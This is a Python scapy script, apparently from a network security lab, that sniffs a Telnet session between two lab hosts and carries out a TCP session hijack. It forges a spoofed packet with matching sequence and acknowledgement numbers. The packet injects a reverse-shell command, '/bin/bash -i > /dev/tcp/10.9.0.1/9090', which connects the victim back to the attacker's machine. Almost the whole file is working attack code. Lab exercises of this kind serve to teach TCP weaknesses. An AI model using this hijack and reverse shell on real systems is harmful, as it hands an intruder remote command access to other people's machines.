from scapy.all import IP, TCP, send, sniff

H1_IP = '10.9.0.6'
V_IP = '10.9.0.5'

def printPkt(pkt):
  src = pkt[IP].src
  dst = pkt[IP].dst
  sport = pkt[TCP].sport
  dport = pkt[TCP].dport
  fl = pkt[TCP].flags
  wd = pkt[TCP].window
  seq = pkt[TCP].seq
  ack = pkt[TCP].ack
  if(pkt[TCP].payload):
    data = pkt[TCP].payload.load
  else: data = ''
  # window length is 64128 in the lab
  print("%s:%d, %s:%d. %s."%(src, sport, dst, dport, fl))
  print("seq=%d, ack=%d. len=%d, data=%s"%(seq, ack, len(data), data))
  print("-------------------")

# Similar to RST attack, must find correct SEQ and ACK value
# local machine holds SEQ and remote server holds ACK value, vice versa in server
# the amount added to ACK is the payload length sent from server, SEQ is sending to server
def hijack(pkt):
  printPkt(pkt)
  ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
  tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags='PA', \
    seq=pkt[TCP].ack+0, ack=pkt[TCP].seq)
  # data = '\n echo "top security" > security.txt \n'
  data = '\n /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \n'
  npkt = ip/tcp/data
  send(npkt, verbose=1)
  exit()

f0 = 'tcp and src host ' + V_IP + ' and src port 23 and dst host ' + H1_IP
f1 = 'tcp'
sniff(iface='br-75f8e3d470c7', filter=f0, prn=hijack)